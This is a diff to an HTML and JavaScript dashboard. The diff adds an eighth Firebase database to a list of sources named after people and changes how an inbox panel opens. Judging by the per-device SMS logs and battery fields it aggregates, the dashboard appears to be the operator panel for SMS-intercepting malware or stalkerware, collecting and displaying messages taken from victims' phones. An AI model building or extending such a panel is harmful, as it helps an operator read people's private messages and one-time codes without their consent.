@@ -49,11 +49,9 @@
             color: var(--text-primary);
             min-height: 100vh;
             padding: 12px 12px 80px 12px;
-            /* bottom padding for FAB */
             overflow-x: hidden;
         }
 
-        /* ── SCROLLBAR ── */
         ::-webkit-scrollbar {
             width: 3px;
             height: 3px;
@@ -66,7 +64,6 @@
             border-radius: 10px;
         }
 
-        /* ── CONTAINER ── */
         .container {
             max-width: 480px;
             margin: 0 auto;
@@ -786,9 +783,12 @@
 
     <script>
         // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        // 1. CONFIG — ALL DATABASE URLs
+        // 1. CONFIG — ALL DATABASE URLs (8 sources)
         // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
         const SOURCES = [
+            // --- PRIMARY SOURCE (your original) ---
+            { id: 'sssssmmmmsw', url: 'https://sssssmmmmsw-default-rtdb.asia-southeast1.firebasedatabase.app/' },
+            // --- OTHER SOURCES ---
             { id: 'neha', url: 'https://neha-2e45d-default-rtdb.firebaseio.com/' },
             { id: 'rajkumar', url: 'https://rajkumar-a67fb-default-rtdb.firebaseio.com/' },
             { id: 'romini', url: 'https://romini-57831-default-rtdb.firebaseio.com/' },
@@ -838,7 +838,6 @@
             if (!device) return null;
             let val = device.battery;
             if (val !== undefined && val !== null) {
-                // If it's a string like "58%", parse it
                 if (typeof val === 'string') {
                     const num = parseInt(val, 10);
                     if (!isNaN(num)) return num;
@@ -860,7 +859,7 @@
 
         function getLatestMessage(device) {
             if (!device) return null;
-            // Check sms_logs (from previous structure)
+            // Check sms_logs
             if (device.sms_logs) {
                 const keys = Object.keys(device.sms_logs);
                 if (keys.length > 0) {
@@ -920,6 +919,7 @@
 
         function getSourceDisplay(sourceId) {
             const map = {
+                'sssssmmmmsw': 'prime',
                 'neha': 'neha',
                 'rajkumar': 'raj',
                 'romini': 'rom',
@@ -954,7 +954,9 @@
                 if (!app) return resolve({ source, data: null, error: 'init failed' });
 
                 const db = firebase.database(app);
-                const ref = db.ref('clients');
+                // For primary source, data is under /users, for others under /clients
+                const path = source.id === 'sssssmmmmsw' ? 'users' : 'clients';
+                const ref = db.ref(path);
 
                 ref.once('value', (snapshot) => {
                     const val = snapshot.val();
@@ -1156,12 +1158,17 @@
         }
 
         // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        // 8. INBOX PANEL
+        // 8. INBOX PANEL — FIXED to open correctly
         // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
         function openInbox(compositeId) {
+            // Prevent opening if no device is selected or if the id is invalid
+            if (!compositeId || !allDevices[compositeId]) {
+                showToast('Device not found');
+                return;
+            }
+
             selectedDeviceId = compositeId;
             const device = allDevices[compositeId];
-            if (!device) return;
 
             const panel = document.getElementById('inboxPanel');
             const container = document.getElementById('inboxMessagesContainer');
